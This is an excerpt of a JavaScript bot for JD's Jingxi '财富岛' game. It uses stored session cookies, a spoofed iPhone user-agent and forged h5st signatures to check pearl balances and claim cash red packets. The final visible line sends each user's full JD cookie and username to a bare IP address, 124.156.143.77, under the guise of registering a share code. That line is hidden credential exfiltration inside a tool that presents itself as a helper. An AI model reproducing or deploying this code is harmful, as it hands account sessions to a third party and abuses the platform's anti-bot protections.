...
!(async () => {
  ...
  await requestAlgo();
  //await $.wait(1000)
  //let res = await getAuthorShareCode('http://share.jdym.cc/sharecode.php?type=cfd&inviteCode=1')
  //console.log(res);
  //return;
  //let res = []
...
function PearlState() {
	let t = +new Date()
	let url1 =`https://m.jingxi.com/jxbfd/user/ComposePearlState?__t=${t}&strZone=jxbfd&dwGetType=0&_=${Date.now() + 2}&sceneval=2&g_login_type=1&callback=jsonpCBKA&g_ty=ls`;
	//url1 += `&h5st=${decrypt(Date.now(), '', '', url1)}&_=${Date.now() + 2}&sceneval=2&g_login_type=1&g_ty=ls`;
  return new Promise(async resolve => {
    const options = {
      ...
      headers: {
        ...
        Cookie: cookie,
        "User-Agent":  `jdpingou;iPhone;4.9.4;14.6;${randomWord(false,40,40)};network/wifi;model/iPhone9,2;appBuild/100579;ADID/00000000-0000-0000-0000-000000000000;supportApplePay/1;hasUPPay/0;pushNoticeIsOpen/1;hasOCPay/0;supportBestPay/0;session/936;pap/JA2019_3111800;brand/apple;supportJDSHWK/1;Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E200`,
      ...
      try {
        if (err) {
          ...
          if (data) {
			...
			var result = data.replace(/jsonpCBKA\(/g, '').replace(/\)/g, '')
			data = JSON.parse(result);
			console.log(data.ddwVirHb)
			//data = '{"ddwVirHb":500,"iRet":0,"sErrMsg":"","strAwardDetail":{"dwAwardLevel":4,"dwIsAward":1,"dwWantLevel":4,"strActName":"jxcfd2_exchange_hchb_20211023","strName":"5.00元"}'
            //console.log(data);
			if (data.iRet === 0)
			{
				//message += data.strAwardDetail.strName;
				message += `【京东账号${$.index}】${$.nickName || $.UserName}\n【可兑换】：${data.ddwVirHb}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
...
function linghongbao100() {
	//https://m.jingxi.com/jxbfd/user/ExchangePrize?strZone=jxbfd&bizCode=jxbfd&source=jxbfd&dwEnv=7&_cfd_t=1634270233888&ptag=7155.9.47&dwType=3&dwLvl=10&ddwPaperMoney=100&strPoolName=jxcfd2_exchange_hb_202110&strPgtimestamp=1634270233848&strPhoneID=f2d061825056d77fe2ea446dcdb940aaaf09dcf6&strPgUUNum=774db899f4a4a958d7928c71ead46ce3&_stk=_cfd_t%2CbizCode%2CddwPaperMoney%2CdwEnv%2CdwLvl%2CdwType%2Cptag%2Csource%2CstrPgUUNum%2CstrPgtimestamp%2CstrPhoneID%2CstrPoolName%2CstrZone&_ste=1&h5st=20211015115713889%3B9987058736387161%3B10032%3Btk01wc0871cdf30nrGU0skBope7ZV%2Ftr1Xaj8Cz8MfEnyqEYb8VGm6mzr8WOxAGNzgCwhxAf%2FJLpuTEnMOsiQeZg%2F0de%3Be0c9794477c5d93620af5ba34796cb4281ccdd0aa17091d0848ba8ed640a0191&_=1634270233897&sceneval=2&g_login_type=1&callback=jsonpCBKEE&g_ty=ls
//jsonpCBKUU({"blkcoupon":[],"blkhb":[],"blknofullsw":[],"blkpool":"jxcfd2_risk_yhq_2021","blksw":[],"blkswpool":"jxcfd2_risk_sw_2021","coupon":[],"couponpool":"jxcfd2_exchange_yhq_2021","ddwNewUserEndTime":1626280462,"ddwTodayEarnRich":729,"ddwUserRich":145744,"dwCurModuleIsUnLock":1,"dwGoodsUnLockLvl":0,"dwHbCouponUnLockLvl":0,"dwIsBlk":0,"dwIsNewUser":0,"dwLandLvl":13,"dwNofullGoodsUnLockLvl":0,"goods":[],"goodspool":"jxcfd2_exchange_sw1_2021","hongbao":[{"ddwAdvanceEndTm":0,"ddwAdvanceStartTm":0,"ddwAdvanceUnLockMoney":0,"ddwGoodsPrice":0,"ddwNeedPay":0,"ddwPaperMoney":100000,"ddwPrice":10000,"ddwQuota":0,"ddwSecKillEndTm":0,"ddwSecKillPaperMoney":0,"ddwSecKillStartTm":0,"dwHbFirst":0,"dwIsAdvance":0,"dwIsNeedJxApp":0,"dwIsNewUserLead":0,"dwIsNewUserPrize":0,"dwIsPlatCoupon":0,"dwIsSecKill":0,"dwIsSecKillIng":0,"dwIsShowStock":0,"dwLvl":3,"dwPos":30001,"dwState":1,"dwStockNum":0,"dwUnLockLvl":5,"strPrizeName":"100元","strPrizePic":"","strSkuId":""},{"ddwAdvanceEndTm":0,"ddwAdvanceStartTm":0,"ddwAdvanceUnLockMoney":0,"ddwGoodsPrice":0,"ddwNeedPay":0,"ddwPaperMoney":50,"ddwPrice":5,"ddwQuota":0,"ddwSecKillEndTm":0,"ddwSecKillPaperMoney":0,"ddwSecKillStartTm":0,"dwHbFirst":0,"dwIsAdvance":0,"dwIsNeedJxApp":0,"dwIsNewUserLead":0,"dwIsNewUserPrize":0,"dwIsPlatCoupon":0,"dwIsSecKill":0,"dwIsSecKillIng":0,"dwIsShowStock":0,"dwLvl":6,"dwPos":30002,"dwState":2,"dwStockNum":206405,"dwUnLockLvl":0,"strPrizeName":"0.05元","strPrizePic":"","strSkuId":""},{"ddwAdvanceEndTm":0,"ddwAdvanceStartTm":0,"ddwAdvanceUnLockMoney":0,"ddwGoodsPrice":0,"ddwNeedPay":0,"ddwPaperMoney":100,"ddwPrice":10,"ddwQuota":0,"ddwSecKillEndTm":0,"ddwSecKillPaperMoney":0,"ddwSecKillStartTm":0,"dwHbFirst":0,"dwIsAdvance":0,"dwIsNeedJxApp":0,"dwIsNewUserLead":0,"dwIsNewUserPrize":0,"dwIsPlatCoupon":0,"dwIsSecKill":0,"dwIsSecKillIng":0,"dwIsShowStock":0,"dwLvl":10,"dwPos":30003,"dwState":2,"dwStockNum":4514,"dwUnLockLvl":1,"strPrizeName":"0.1元","strPrizePic":"","strSkuId":""},{"ddwAdvanceEndTm":0,"ddwAdvanceStartTm":0,"ddwAdvanceUnLockMoney":0,"ddwGoodsPrice":0,"ddwNeedPay":0,"ddwPaperMoney":200,"ddwPrice":20,"ddwQuota":0,"ddwSecKillEndTm":0,"ddwSecKillPaperMoney":0,"ddwSecKillStartTm":0,"dwHbFirst":0,"dwIsAdvance":0,"dwIsNeedJxApp":0,"dwIsNewUserLead":0,"dwIsNewUserPrize":0,"dwIsPlatCoupon":0,"dwIsSecKill":0,"dwIsSecKillIng":0,"dwIsShowStock":0,"dwLvl":9,"dwPos":30004,"dwState":0,"dwStockNum":3146,"dwUnLockLvl":2,"strPrizeName":"0.2元","strPrizePic":"","strSkuId":""},{"ddwAdvanceEndTm":0,"ddwAdvanceStartTm":0,"ddwAdvanceUnLockMoney":0,"ddwGoodsPrice":0,"ddwNeedPay":0,"ddwPaperMoney":500,"ddwPrice":50,"ddwQuota":0,"ddwSecKillEndTm":0,"ddwSecKillPaperMoney":0,"ddwSecKillStartTm":0,"dwHbFirst":0,"dwIsAdvance":0,"dwIsNeedJxApp":0,"dwIsNewUserLead":0,"dwIsNewUserPrize":0,"dwIsPlatCoupon":0,"dwIsSecKill":0,"dwIsSecKillIng":0,"dwIsShowStock":0,"dwLvl":8,"dwPos":30005,"dwState":0,"dwStockNum":1785,"dwUnLockLvl":2,"strPrizeName":"0.5元","strPrizePic":"","strSkuId":""},{"ddwAdvanceEndTm":0,"ddwAdvanceStartTm":0,"ddwAdvanceUnLockMoney":0,"ddwGoodsPrice":0,"ddwNeedPay":0,"ddwPaperMoney":1000,"ddwPrice":100,"ddwQuota":0,"ddwSecKillEndTm":0,"ddwSecKillPaperMoney":0,"ddwSecKillStartTm":0,"dwHbFirst":0,"dwIsAdvance":0,"dwIsNeedJxApp":0,"dwIsNewUserLead":0,"dwIsNewUserPrize":0,"dwIsPlatCoupon":0,"dwIsSecKill":0,"dwIsSecKillIng":0,"dwIsShowStock":0,"dwLvl":7,"dwPos":30006,"dwState":1,"dwStockNum":0,"dwUnLockLvl":2,"strPrizeName":"1元","strPrizePic":"","strSkuId":""}],"hongbaopool":"jxcfd2_exchange_hb_202110","iRet":0,"nofullgoods":[],"nofullgoodspool":"jxcfd2_exchange_sw2_2021","sErrMsg":""}
	let t = +new Date()
	let url1 =`https://m.jingxi.com/jxbfd/user/ExchangePrize?strZone=jxbfd&bizCode=jxbfd&source=jxbfd&dwEnv=7&_cfd_t=${t}&ptag=7155.9.47&dwType=3&dwLvl=3&ddwPaperMoney=100000&strPoolName=jxcfd2_exchange_hb_202110&strPgtimestamp=${Date.now() + 2}&strPhoneID=f2d061825056d77fe2ea446dcdb940aaaf09dcf6&strPgUUNum=774db899f4a4a958d7928c71ead46ce3&_stk=_cfd_t%2CbizCode%2CddwPaperMoney%2CdwEnv%2CdwLvl%2CdwType%2Cptag%2Csource%2CstrPgUUNum%2CstrPgtimestamp%2CstrPhoneID%2CstrPoolName%2CstrZone&_ste=1`;
	url1 += `&h5st=${decrypt(Date.now(), '', '', url1)}&_=${Date.now() + 2}&sceneval=2&g_login_type=1&callback=jsonpCBKE&g_ty=ls`;
	//url1 = 'https://m.jingxi.com/jxbfd/user/ExchangePearlHb?__t=1636649354654&strZone=jxbfd&dwLvl=5&dwIsRandHb=0&ddwVirHb=20&strPoolName=anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDk%3D&dwExchangeType=0&_stk=__t%2CddwVirHb%2CdwExchangeType%2CdwIsRandHb%2CdwLvl%2CstrPoolName%2CstrZone&_ste=1&h5st=20211112004914654%3B9987058736387161%3B10032%3Btk01w994c1bb830n2E7ASdfQuaceWhzoSYKVF7CUwE4p1GdqhdmhqRjV42qWKQ7B7lvlC%2B5MBa40cTXG71izlIAzSdYy%3Bf64d28094e47042b9b7421849ddbf6411b2b042c637bb99dfb59a40df10a210f&_=1636649354656&sceneval=2&g_login_type=1&callback=jsonpCBKH&g_ty=ls'
  return new Promise(async resolve => {
    const options = {
      url: url1,
      headers: {
...
function linghongbao10() {
	//jsonpCBKH({"ddwVirHb":801,"dwExchangeType":0,"exchangeInfo":{"prizeInfo":[{"Condition":[{"descr":"本赛季连续登陆(1/1) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满1元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":20,"dwLvl":5,"dwState":1,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"0.2元"},{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到3级","reach":1,"type":2},{"descr":"满1元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":100,"dwLvl":4,"dwState":1,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"1元"},{"Condition":[{"descr":"本赛季连续登陆(3/3) 天","reach":1,"type":1},{"descr":"岛主等级达到3级","reach":1,"type":2},{"descr":"满5元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":500,"dwLvl":3,"dwState":0,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"5元"},{"Condition":[{"descr":"本赛季连续登陆(3/5) 天","reach":0,"type":1},{"descr":"岛主等级达到5级","reach":1,"type":2},{"descr":"满10元解锁兑换资格","reach":0,"type":0}],"ddwVirHb":1000,"dwLvl":2,"dwState":10,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"10元"},{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满100元解锁兑换资格","reach":0,"type":0}],"ddwVirHb":10000,"dwLvl":1,"dwState":10,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"100元"}],"randHbPrizeInfo":{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满5元解锁兑换资格","reach":1,"type":0}],"dwState":0,"strMaxHb":"5","strMinHb":"0.1","strPool":"anhjZmQyX2V4Y2hhbmdlX2hjc2poYl8yMDIxMTE="}},"iRet":0,"sErrMsg":""}

	let t = +new Date()
	let url1 =`https://m.jingxi.com/jxbfd/user/ExchangePearlHb?__t=${t}&strZone=jxbfd&dwLvl=2&dwIsRandHb=0&ddwVirHb=1000&strPoolName=anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ%3D&dwExchangeType=0&_stk=__t%2CddwVirHb%2CdwExchangeType%2CdwIsRandHb%2CdwLvl%2CstrPoolName%2CstrZone&_ste=1`;
	url1 += `&h5st=${decrypt(Date.now(), '', '', url1)}&_=${Date.now() + 2}&sceneval=2&g_login_type=1&callback=jsonpCBKE&g_ty=ls`;
  return new Promise(async resolve => {
    const options = {
      url: url1,
...
function linghongbao5() {
	//jsonpCBKG({"ddwVirHb":1076,"dwExchangeType":0,"exchangeInfo":{"prizeInfo":[{"Condition":[{"descr":"本赛季连续登陆(1/1) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满1元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":20,"dwLvl":5,"dwState":0,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI=","strPrizeName":"0.2元"},{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到3级","reach":1,"type":2},{"descr":"满1元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":100,"dwLvl":4,"dwState":0,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI=","strPrizeName":"1元"},{"Condition":[{"descr":"本赛季连续登陆(3/3) 天","reach":1,"type":1},{"descr":"岛主等级达到3级","reach":1,"type":2},{"descr":"满5元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":500,"dwLvl":3,"dwState":0,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI=","strPrizeName":"5元"},{"Condition":[{"descr":"本赛季连续登陆(3/5) 天","reach":0,"type":1},{"descr":"岛主等级达到5级","reach":1,"type":2},{"descr":"满10元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":1000,"dwLvl":2,"dwState":10,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI=","strPrizeName":"10元"},{"Condition":[{"descr":"本赛季连续登陆(1/1) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满100元解锁兑换资格","reach":0,"type":0}],"ddwVirHb":10000,"dwLvl":1,"dwState":10,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI=","strPrizeName":"100元"}],"randHbPrizeInfo":{"Condition":[{"descr":"本赛季连续登陆(1/1) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满5元解锁兑换资格","reach":1,"type":0}],"dwState":0,"strMaxHb":"5","strMinHb":"0.1","strPool":"anhjZmQyX2V4Y2hhbmdlX2hjc2poYl8yMDIxMTE="}},"iRet":0,"sErrMsg":""}
	//注意  dwLvl  strPoolName strPool
	let t = +new Date()
	let url1 =`https://m.jingxi.com/jxbfd/user/ExchangePearlHb?__t=${t}&strZone=jxbfd&dwLvl=3&dwIsRandHb=0&ddwVirHb=500&strPoolName=anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI%3D&dwExchangeType=0&_stk=__t%2CddwVirHb%2CdwExchangeType%2CdwIsRandHb%2CdwLvl%2CstrPoolName%2CstrZone&_ste=1`;
	url1 += `&h5st=${decrypt(Date.now(), '', '', url1)}&_=${Date.now() + 2}&sceneval=2&g_login_type=1&g_ty=ls`;
  return new Promise(async resolve => {
    const options = {
      url: url1,
      ...
      try {
        if (err) {
          ...
          if (data) {
			...
			{
				//message += data.strAwardDetail.strName;
				message += `【京东账号${$.index}】${$.nickName || $.UserName}\n【兑换】：${data.strAwardDetail.strName}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
				//console.log(data.strAwardDetail.strName);
			}
			if (data.iRet === 2046)
			{
				//message += data.sErrMsg;
				message += `【京东账号${$.index}】${$.nickName || $.UserName}\n【兑换】：${data.sErrMsg}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
...
function linghongbao1() {
	//jsonpCBKH({"ddwVirHb":801,"dwExchangeType":0,"exchangeInfo":{"prizeInfo":[{"Condition":[{"descr":"本赛季连续登陆(1/1) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满1元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":20,"dwLvl":5,"dwState":1,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"0.2元"},{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到3级","reach":1,"type":2},{"descr":"满1元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":100,"dwLvl":4,"dwState":1,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"1元"},{"Condition":[{"descr":"本赛季连续登陆(3/3) 天","reach":1,"type":1},{"descr":"岛主等级达到3级","reach":1,"type":2},{"descr":"满5元解锁兑换资格","reach":1,"type":0}],"ddwVirHb":500,"dwLvl":3,"dwState":0,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"5元"},{"Condition":[{"descr":"本赛季连续登陆(3/5) 天","reach":0,"type":1},{"descr":"岛主等级达到5级","reach":1,"type":2},{"descr":"满10元解锁兑换资格","reach":0,"type":0}],"ddwVirHb":1000,"dwLvl":2,"dwState":10,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"10元"},{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满100元解锁兑换资格","reach":0,"type":0}],"ddwVirHb":10000,"dwLvl":1,"dwState":10,"strPool":"anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMDQ=","strPrizeName":"100元"}],"randHbPrizeInfo":{"Condition":[{"descr":"本赛季连续登陆(2/2) 天","reach":1,"type":1},{"descr":"岛主等级达到2级","reach":1,"type":2},{"descr":"满5元解锁兑换资格","reach":1,"type":0}],"dwState":0,"strMaxHb":"5","strMinHb":"0.1","strPool":"anhjZmQyX2V4Y2hhbmdlX2hjc2poYl8yMDIxMTE="}},"iRet":0,"sErrMsg":""}
	//注意  dwLvl  strPoolName strPool
	let t = +new Date()
	let url1 =`https://m.jingxi.com/jxbfd/user/ExchangePearlHb?__t=${t}&strZone=jxbfd&dwLvl=4&dwIsRandHb=0&ddwVirHb=100&strPoolName=anhjZmQyX2V4Y2hhbmdlX2hjaGJfMjAyMTExMTI%3D&dwExchangeType=0&_stk=__t%2CddwVirHb%2CdwExchangeType%2CdwIsRandHb%2CdwLvl%2CstrPoolName%2CstrZone&_ste=1`;
	url1 += `&h5st=${decrypt(Date.now(), '', '', url1)}&_=${Date.now() + 2}&sceneval=2&g_login_type=1&g_ty=ls`;
  return new Promise(async resolve => {
    const options = {
      url: url1,
      ...
      try {
        if (err) {
          ...
          if (showInvite && strMyShareId) {
			...
			create(`http://124.156.143.77/sharecode.php?id=${strMyShareId}@${$.UserName}@${$.UserName}@cfd@${cookie}`,"财富岛");
